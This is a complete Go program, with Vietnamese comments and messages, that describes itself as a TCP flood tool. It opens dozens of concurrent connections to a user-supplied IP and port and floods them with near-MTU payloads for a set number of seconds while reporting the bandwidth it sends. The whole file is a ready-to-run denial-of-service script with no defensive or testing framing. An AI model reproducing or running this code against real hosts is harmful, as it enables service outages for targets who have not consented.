
package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

func main() {
	runtime.GOMAXPROCS(4) // lock 4 core (có thể tăng nếu máy mạnh)

	if len(os.Args) != 4 {
		fmt.Println("Cách dùng: go run tcp.go <ip> <port> <seconds>")
		fmt.Println("Ví dụ:   go run tcp.go 127.0.0.1 80 60")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil || port < 1 || port > 65535 {
		fmt.Println("Port không hợp lệ")
		os.Exit(1)
	}

	dur, err := strconv.Atoi(os.Args[3])
	if err != nil || dur < 1 {
		fmt.Println("Thời gian phải là số nguyên dương (giây)")
		os.Exit(1)
	}

	target := fmt.Sprintf("%s:%d", targetIP, port)

	const conns = 32           // số TCP connection đồng thời
	const workersPerConn = 6   // tổng goroutine ~192
	const payloadSize = 1400   // gần MTU, hiệu quả băng thông

	payloadPool := sync.Pool{
		New: func() any {
			p := make([]byte, payloadSize)
			for i := range p {
				p[i] = byte(i % 255)
			}
			return p
		},
	}

	var wg sync.WaitGroup
	var sent atomic.Uint64
	var bytesSent atomic.Uint64

	end := time.Now().Add(time.Duration(dur) * time.Second)

	fmt.Printf("Bắt đầu TCP flood → %s trong %d giây\n", target, dur)
	fmt.Printf("~%d connections / ~%d workers\n", conns, conns*workersPerConn)

	for i := 0; i < conns; i++ {
		conn, err := net.DialTimeout("tcp", target, 4*time.Second)
		if err != nil {
			// fmt.Println("Dial err:", err) // comment để sạch log
			continue
		}
		// Không defer close ngay vì ta muốn giữ conn sống lâu

		for j := 0; j < workersPerConn; j++ {
			wg.Add(1)
			go func(c net.Conn) {
				defer wg.Done()
				defer c.Close() // chỉ close khi worker thoát

				for time.Now().Before(end) {
					p := payloadPool.Get().([]byte)
					n, err := c.Write(p)
					payloadPool.Put(p)

					if err != nil || n == 0 {
						return // conn chết → thoát worker
					}

					sent.Add(1)
					bytesSent.Add(uint64(n))
				}
			}(conn)
		}
	}

	// In tốc độ realtime (mỗi 2 giây)
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		start := time.Now()

		for range ticker.C {
			if time.Now().After(end) {
				return
			}
			pkts := sent.Load()
			byts := bytesSent.Load()
			sec := time.Since(start).Seconds()
			mb := float64(byts) / 1024 / 1024
			mbps := mb * 8 / sec

			fmt.Printf("\rGửi: %d gói | %.2f MB | Avg: %.1f Mbps", pkts, mb, mbps)
		}
	}()

	wg.Wait()

	// Kết quả cuối
	pkts := sent.Load()
	byts := bytesSent.Load()
	mb := float64(byts) / 1024 / 1024
	sec := float64(dur)

	fmt.Printf("\n\nHoàn thành.\n")
	fmt.Printf("Tổng gói:     %d\n", pkts)
	fmt.Printf("Tổng dữ liệu: %.2f MB\n", mb)
	fmt.Printf("Tốc độ TB:    %.2f Mbps\n", mb*8/sec)
}